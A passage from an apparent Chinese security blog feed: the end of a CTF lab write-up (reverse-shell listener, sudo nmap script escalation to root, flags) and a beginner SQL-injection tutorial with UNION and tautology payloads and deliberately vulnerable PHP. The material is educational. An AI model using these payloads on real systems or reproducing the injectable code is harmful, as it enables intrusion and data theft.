class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/home/kali/baji/Chromatica]<br>└─# nc -lvnp 1234                    <br>listening on [any] 1234 ...<br>connect to [192.168.56.4] from (UNKNOWN) [192.168.56.15] 58340<br>bash: cannot set terminal process group (1900): Inappropriate ioctl for device<br>bash: no job control in this shell<br>analyst@Chromatica:~$ id<br>id<br>uid=1002(analyst) gid=1002(analyst) groups=1002(analyst)<br><br><br>analyst@Chromatica:~$ cat a<br>cat analyst.txt <br>brightctf&#123;GAZETTO_RUKI_b2f4f50f398&#125;<br></code></pre></td></tr></table></figure><p>现在进行root提权</p><h1 id="root提权"><a href="#root提权" class="headerlink" title="root提权"></a>root提权</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell">analyst@Chromatica:~$ sudo -l<br>sudo -l<br>Matching Defaults entries for analyst on Chromatica:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,<br>    use_pty<br><br>User analyst may run the following commands on Chromatica:<br>    (ALL : ALL) NOPASSWD: /usr/bin/nmap<br>analyst@Chromatica:~$ TF=$(mktemp)<br>TF=$(mktemp)<br>analyst@Chromatica:~$ echo &#x27;os.execute(&quot;/bin/sh&quot;)&#x27; &gt; $TF<br>echo &#x27;os.execute(&quot;/bin/sh&quot;)&#x27; &gt; $TF<br>analyst@Chromatica:~$ sudo nmap --script=$TF<br>sudo nmap --script=$TF<br>Starting Nmap 7.80 ( https://nmap.org ) at 2024-11-10 03:24 UTC<br>NSE: Warning: Loading &#x27;/tmp/tmp.Smvzxjn9Bu&#x27; -- the recommended file extension is &#x27;.nse&#x27;.<br>id<br>uid=0(root) gid=0(root) groups=0(root)<br>cat /root/root.txt<br>brightctf&#123;DIR_EN_GREY_59ce1d6c207&#125;<br></code></pre></td></tr></table></figure><p>cx 师傅说：flag 别不打靶机就交，只冲榜是没有意义的。</p>]]></content>
    
    
    <categories>
      
      <category>cx的渗透日记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入</title>
    <link href="/2024/11/10/SQL%E6%B3%A8%E5%85%A5/"/>
    <url>/2024/11/10/SQL%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p>以前一直搞不太懂 SQL 注入的一些东西，不知道为什么要加单引号或双引号，为什么有时候用 and 但有时候又用 or，最近看了一些 SQL 注入知识点，所以总结一些 qwq</p><span id="more"></span><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>寻找功能点进行测试，达到非预期执行数据库语句</p><p>比如</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> username,password from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span> = butt3rf1y;<br></code></pre></td></tr></table></figure><p>一般在以下地方容易存在注入点：</p><p>URL参数：例如在查询字符串或路径中</p><p>表单输入：应用程序中的表单输入框，如用户名、密码、搜索框等，如果没有进行充分的输入验证和过滤，就可能成为 SQL 注入的目标</p><p>Cookie：如果应用程序使用 Cookie 来存储用户信息或会话状态，可以通过修改 Cookie 中的值来进行 SQL 注入</p><p>HTTP头部：有些应用程序可能会从 HTTP 头部中获取数据，可以在 HTTP 头部中进行 SQL 注入</p><p>数据库查询语句：如果有源码，直接进行代码审计，可能有直接拼接 SQL 查询语句的地方，存在 SQL 注入</p><h2 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h2><p><img src="/2024/11/06/TestWP/QLschema.png"></p><p>如上图，数据库的结构为</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs livescript">+数据库 <span class="hljs-function"><span class="hljs-params">(database)</span>--&gt;</span>ctf_database<br>+ - 表_user <span class="hljs-function"><span class="hljs-params">(table_user)</span>--&gt;</span>user<br>+ - 表_users <span class="hljs-function"><span class="hljs-params">(table_users)</span>--&gt;</span>users<br>+ + - 列_id <span class="hljs-function"><span class="hljs-params">(column_id)</span>--&gt;</span>id<br>+ + - 列_username <span class="hljs-function"><span class="hljs-params">(column_username)</span>--&gt;</span>username<br>+ + - 列_password <span class="hljs-function"><span class="hljs-params">(column_password)</span>--&gt;</span>password<br>+ + + - 数据<br>+ + + - 数据<br></code></pre></td></tr></table></figure><h2 id="常用语法"><a href="#常用语法" class="headerlink" title="常用语法"></a>常用语法</h2><p><code>SECLECT</code></p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> 列名<span class="hljs-number">1</span>, 列名<span class="hljs-number">2</span>, ... <span class="hljs-keyword">from</span> 表名 <span class="hljs-keyword">where</span> 条件<br></code></pre></td></tr></table></figure><p><code>UNION</code></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> 列名<span class="hljs-number">1</span> <span class="hljs-keyword">from</span> 表名<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> 列名<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> 表名<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>使用 <code>union</code> 的时候两个表列数必须相同</p><p><code>Order by</code></p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> column1, column2, ... <span class="hljs-keyword">from</span> table_name [<span class="hljs-keyword">where</span> condition] <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> column_name<br></code></pre></td></tr></table></figure><p>一般用来判断列数，比如说</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs s">select column1，column2 from table_name order by 1;//不报错<br>select column1，column2 from table_name order by 2;//不报错<br>select column1，column2 from table_name order by 3;//报错<br>//说明只有2列<br></code></pre></td></tr></table></figure><h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><p><code>user()</code>：当前数据库用户</p><p><code>database()</code>：当前数据库名</p><p><code>concat()</code>：联合数据，用于联合两条数据。比如 <code>concat(username,0x30,password)</code> 将 <code>username</code> 和 <code>password</code> 通过 <code>:</code> 连接起来</p><p><code>group_concat</code>：和 <code>concat</code> 类似，用于把多条数据一次注入出来</p><p><code>select xxoo into outfile &#39;路径&#39;</code>：权限较高时可直接写文件</p><h1 id="基本注入类型"><a href="#基本注入类型" class="headerlink" title="基本注入类型"></a>基本注入类型</h1><h2 id="注入类型判断"><a href="#注入类型判断" class="headerlink" title="注入类型判断"></a>注入类型判断</h2><p>SQL 处理语句后台的写法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> username,password from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span> = ?<br></code></pre></td></tr></table></figure><p><code>?</code> 这里有多种闭合方式，比如:<code>$id</code>，<code>&#39;$id&#39;</code>，<code>“$id”</code>，<code>($id)</code></p><p>然后<strong>构造闭合</strong>，其实这个词我也不太懂，看了一下探姬师傅的 hello-ctf 上的解释，是这样的：</p><p>比如后台为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> username,password from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$id</span>&quot;</span><br></code></pre></td></tr></table></figure><p>那么我们使传入的 <code>$id=&#39;1&quot;&#39;</code> ，后台执行则为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> username,password from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;1&quot;</span><span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p>在这里对 <code>1</code> 完成了闭合构造，但是闭合了前序导致后续的 <code>&quot;</code> 没有双引号配对，多出来的这个双引号就会导致报错：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1064 </span>- You have an <span class="hljs-keyword">error</span> in your SQL syntax; check the manual that corresponds <span class="hljs-keyword">to</span> your MySQL server version <span class="hljs-keyword">for</span> the right syntax <span class="hljs-keyword">to</span> use near <span class="hljs-comment">&#x27;&quot;&#x27; at line 1</span><br></code></pre></td></tr></table></figure><p>所以通常在构造完闭合后去注释掉后面的符号，比如使用 <code>#</code>,<code>--</code></p><h3 id="是否报错判断"><a href="#是否报错判断" class="headerlink" title="是否报错判断"></a>是否报错判断</h3><p><code>&quot;1&#39;&quot;</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> username,password from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span> = <span class="hljs-string">&quot;1&#x27;&quot;</span><br>// <span class="hljs-string">&quot;&quot;</span> 中为可以包含 <span class="hljs-string">&#x27;,而 1&#x27;</span>是一个合法字符串，在查询时会先被强制类型转换为数字，不会报错<br></code></pre></td></tr></table></figure><p><code>1&#39;</code></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> uders <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">// 因为这里的&#x27;</span>没有闭合，会报错<br></code></pre></td></tr></table></figure><p><code>&#39;1&#39;&#39;</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> username,password from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span> = <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">// &#x27;</span>与前面的<span class="hljs-string">&#x27;闭合了,但是剩了一个 &#x27;</span>，会报错<br></code></pre></td></tr></table></figure><h3 id="报错信息判断"><a href="#报错信息判断" class="headerlink" title="报错信息判断"></a>报错信息判断</h3><p><code>1&quot;</code></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">执行：id = <span class="hljs-string">&quot;1&quot;</span><span class="hljs-comment">&quot;</span><br>报错：near <span class="hljs-string">&#x27;&quot;1&quot;&quot;&#x27;</span> at <span class="hljs-built_in">line</span> <span class="hljs-number">1</span><br>//去掉外层 SQL 的单引号，留下 <span class="hljs-string">&quot;1&quot;</span><span class="hljs-comment">&quot;,可以判断出是双引号的字符型注入</span><br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL1.png"></p><p><code>1&#39;</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">执行：<span class="hljs-built_in">id</span> = <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">报错：near &#x27;</span>1<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27; at line 1</span><br><span class="hljs-string">// 去掉外层留下 &#x27;</span>1<span class="hljs-string">&#x27;&#x27;</span>,再除去注入的 1<span class="hljs-string">&#x27;,可以判断出是单引号的字符型注入</span><br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL2.png"></p><p><code>&#39;1</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">执行：<span class="hljs-built_in">id</span> = <span class="hljs-string">&#x27;&#x27;</span>1<span class="hljs-string">&#x27;</span><br><span class="hljs-string">报错：near &#x27;</span><span class="hljs-string">&#x27;1&#x27;</span> at line 1<br>// 对于 SQL,<span class="hljs-built_in">id</span> = <span class="hljs-string">&#x27;&#x27;</span>已经闭合，所以 1<span class="hljs-string">&#x27; 成为了报错点</span><br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL3.png"></p><h2 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);<br><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$conn</span>,<span class="hljs-string">&quot;select username from users where id=&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<br><span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_array</span>(<span class="hljs-variable">$res</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;username&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>根据用户输入 id，查询用户信息。用户的输入 id 字段，没有任何过滤地被直接拼接在了 sql 查询语句中。由于 id 没有被引用包裹，而且类型为数字，此为数字型注入。</p><p>可以使用在语句中加入运算符来测试这种注入是否存在</p><p>sql 关键字 <strong>union</strong>，将两个 select 语句结果合并到一个结果集中，但要求两个 select 语句拥有相同的列数。</p><p>使用联合查询 <code>union</code> 基于 <code>information_schema</code> 拿到数据库名</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">schema_name</span> <span class="hljs-keyword">from</span> information_schema.schemata;<br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL4.png"></p><p>以把 1 换成其他的，比如 <code>database()</code></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>(),<span class="hljs-built_in">schema_name</span> <span class="hljs-keyword">from</span> information_schema.schemata;<br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL5.png"></p><p><strong>空格的 url 编码是 %20</strong>，如果要查询其他行，还需要使用 **limit **关键字。</p><p>使用联合查询去得到数据库的表名，先获取当前库（<code>database()</code>）</p><p>基于 <code>UNION</code> <code>GROUP_CONCAT(table_name)</code> 和 <code>information_schema.tables</code> 查询</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>),<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema = <span class="hljs-keyword">database</span>();<br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL6.png"></p><p>获取 表 的对应字段名</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>),<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema = <span class="hljs-keyword">database</span>();<br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL7.png"></p><h2 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);<br><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$conn</span>,<span class="hljs-string">&quot;select id from users where username=&#x27;&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&quot;&#x27;&quot;</span>);<br><span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_array</span>(<span class="hljs-variable">$res</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>通过 username 查询 id，而且用户输入的 username 被单引号包裹起来了。所有用户的所有输入都会被当成字符串处理，无法将之前的数字型注入的 payload 进行注入了。如果输入中有一个引号，就可以将前面的引号闭合，使得后面的内容从字符串中逃逸出来。最后将后面的引号注释掉。</p><p><strong>首先就需要构造单引号的闭合</strong></p><p>使用一个单引号将字符串闭合，在输入 sql 语句，最后用 # 号将后面的单引号注释掉。</p><p>比如：<strong>username &#x3D; ‘or 1&#x3D;1 #</strong>,</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">select id <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>where <span class="hljs-attribute">username</span>=<span class="hljs-string">&#x27;&#x27;</span>or <span class="hljs-attribute">1</span>=1 #;<br></code></pre></td></tr></table></figure><p>在 where 语句中，or 连接两个表达式，第一个返回假第二个返回真，or 操作后返回真，整个操作返回所有的结果集。</p><p><code>username=-1’ or ‘1’=‘1’ --</code></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1&#x27;</span> -- <span class="hljs-string">&#x27; and password = &#x27;</span>$<span class="hljs-keyword">password</span><span class="hljs-string">&#x27;;</span><br></code></pre></td></tr></table></figure><p>这样就直接可以使 <code>where</code> 条件为<strong>永真</strong>，直接输出 <code>select * from user</code> 的所有内容</p><p><img src="/2024/11/06/TestWP/QL8.png"></p><p><code>order by</code> 判断函数</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">1</span><span class="hljs-comment">-- &#x27; and password = &#x27;$password&#x27;;</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">2</span><span class="hljs-comment">-- &#x27; and password = &#x27;$password&#x27;;</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span><span class="hljs-comment">-- &#x27; and password = &#x27;$password&#x27;;</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">4</span><span class="hljs-comment">-- &#x27; and password = &#x27;$password&#x27;;//报错</span><br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL9.png"></p><p>库名</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">schema_name</span>,<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> information_schema.schemata;<span class="hljs-comment">-- &#x27; and password = &#x27;$password&#x27;;</span><br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL10.png"></p><p>表名</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>),<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<span class="hljs-comment">-- &#x27; and password = &#x27;$password&#x27;;</span><br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL11.png"></p><p>字段名</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>),<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<span class="hljs-comment">-- &#x27; and password = &#x27;$password&#x27;;</span><br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL12.png"></p><h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><p>顾名思义就是服务器不显示查询结果，只返回是否查询成功时，无法使用 union 直接回显数据，需要盲注。盲注有时间盲注和布尔盲注。</p><p>例句</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">$sql = &quot;<span class="hljs-keyword">SELECT</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id = <span class="hljs-string">&quot;.$_GET[&quot;</span>id<span class="hljs-string">&quot;];</span><br></code></pre></td></tr></table></figure><p>有时候防火墙拦截过滤了 and 但 or 可能没有被过滤拦截，那就可以用 or 来进行盲注</p><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>比如 id 传参是</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">id</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span> and <span class="hljs-number">1</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>执行语句：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span> = <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL13.png"></p><p>这里要求两个条件为真，一是有 <code>id=1</code>，二是 <code>1=1</code>。</p><p>如果 输入<code>1=2</code>，并不会有回显，返回为空，因为 <code>and</code> 后面的条件并不满足。</p><p>所以可以利用此特点来获取其他信息：</p><h3 id="length-获取长度信息"><a href="#length-获取长度信息" class="headerlink" title="length()获取长度信息"></a><strong><code>length()</code>获取长度信息</strong></h3><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">id</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span> and length(username) <span class="hljs-operator">=</span> num<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>利用 <code>length()</code> 函数爆破数据长度</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> username，<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">length</span>(username) =<span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>还可以使用二分</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">id</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span> and length(username)&lt; num<br><span 